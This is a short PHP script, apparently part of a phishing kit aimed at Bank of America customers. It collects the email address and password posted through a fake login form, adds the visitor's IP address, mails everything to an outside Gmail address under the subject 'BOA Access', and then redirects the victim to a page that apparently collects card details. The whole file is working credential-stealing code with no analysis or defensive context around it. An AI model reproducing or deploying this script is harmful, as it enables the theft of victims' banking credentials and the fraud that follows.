<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || tHAnks tO CoMtECh || :------\n";
$message .= "Email Address             : ".$_POST['Email']."\n";
$message .= "Email Password              : ".$_POST['Password']."\n";
$message .= "----: || tHAnks tO CoMtECh || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "masterpah10@gmail.com";
$subject = "BOA Access | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  ccboa.htm");
?>


